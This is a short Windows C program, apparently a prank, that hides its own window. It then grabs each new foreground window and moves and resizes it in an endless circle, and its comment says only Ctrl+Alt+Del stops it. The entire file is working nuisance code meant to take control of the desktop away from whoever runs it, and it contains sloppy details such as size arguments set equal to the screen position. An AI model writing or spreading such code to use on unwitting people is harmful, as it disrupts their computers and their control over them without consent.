// Randomly moves the window round. Only Ctrl+Alt+Del will work here.

#include <windows.h>
#include <math.h>

DWORD WINAPI moveit(){
    int i,j,k;
    HWND a = GetForegroundWindow();
    for(k=0;;k++){
        i=400+150*cos(k);
        j=200+150*sin(k);
        MoveWindow(a,i,j,i,j,1);
        Sleep(40);
    }
}

main(){
    DWORD dwThreadId;
    HWND tmp = GetForegroundWindow();
    HWND last = tmp;

    ShowWindow(tmp, SW_HIDE);
    Sleep(1000);

    while(1){
        tmp = GetForegroundWindow();
        if(tmp != last){
            CreateThread(NULL, 0, moveit, &tmp, 0, &dwThreadId);
            last = tmp;
        }
    }
}
